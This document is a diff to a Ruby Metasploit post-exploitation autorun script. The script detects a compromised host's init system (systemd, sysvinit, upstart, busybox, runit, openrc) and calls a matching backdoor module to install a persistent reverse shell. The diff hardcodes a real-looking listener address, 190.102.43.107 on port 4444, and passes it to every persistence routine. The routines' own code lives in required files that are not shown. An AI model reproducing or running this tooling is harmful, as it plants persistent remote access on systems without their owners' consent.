@@ -1,13 +1,6 @@
 require '/home/msf/msf-autorunscripts/init_detector'
 require '/home/msf/msf-autorunscripts/busyboxx_backdoor_inittab'
-require '/home/msf/msf-autorunscripts/openrc_backdoor_init'
-require '/home/msf/msf-autorunscripts/systemd_backdoor_systemctl'
-require '/home/msf/msf-autorunscripts/sysvinit_backdoor_rc_local'
-require '/home/msf/msf-autorunscripts/upstart_backdoor_conf'
-require '/home/msf/msf-autorunscripts/runit_backdoor_sv'
-require '/home/msf/msf-autorunscripts/init_detector'
-require '/home/msf/msf-autorunscripts/busyboxx_backdoor_inittab'
-require '/home/msf/msf-autorunscripts/openrc_backdoor_init'
+require '/home/msf/msf-autorunscripts/openrc_backdoor_initd'
 require '/home/msf/msf-autorunscripts/systemd_backdoor_systemctl'
 require '/home/msf/msf-autorunscripts/sysvinit_backdoor_rc_local'
 require '/home/msf/msf-autorunscripts/upstart_backdoor_conf'
@@ -19,35 +12,42 @@ sid       = client.sid
 
 print("\n")
 #SessionSanitizer.run(fm, target_ip, sid)
-#SessionSanitizer.run(fm, target_ip, sid)
 print("\n")
 #ShellPromotion.run(fm, sid, target_ip, client)
-#ShellPromotion.run(fm, sid, target_ip, client)
 print("\n")
+
 init_type = InitDetector.detect(session)
+
+lhost = "190.102.43.107"
+lport = "4444"
 
 print("\n")
 if init_type == :sysvinit
-  print_status("SysVynit was detected")
-  RcLocalReverseShell.run(session)
+    print_status("SysVynit was detected")
+    RcLocalReverseShell.run(fm, sid, client,lhost,lport)
 end
 
 if init_type == :systemd
-    SystemdReverseShell.run(fm, sid, client)
+    print_status("Systemd was detected")
+    SystemdReverseShell.run(fm, sid, client,lhost,lport)
 end
 
 if init_type == :upstart
-    UpstartReverseShell.run(fm, sid, client)
+    print_status("Upstart was detected")
+    UpstartReverseShell.run(fm, sid, client,lhost,lport)
 end
 
 if init_type == :busybox
-    BusyboxInittabReverseShell.run(fm, sid, client)
+    print_status("Busybox was detected")
+    BusyboxInittabReverseShell.run(fm, sid, client,lhost,lport)
 end
 
 if init_type == :runit
-    RunitReverseShell.run(fm, sid, client)
+    print_status("RunIt was detected")
+    RunitReverseShell.run(fm, sid, client,lhost,lport)
 end
 
 if init_type == :openrc
-    OpenrcReverseShell.run(fm, sid, client)
+    print_status("OpenRC was detected")
+    OpenrcReverseShell.run(fm, sid, client,lhost,lport)
 end
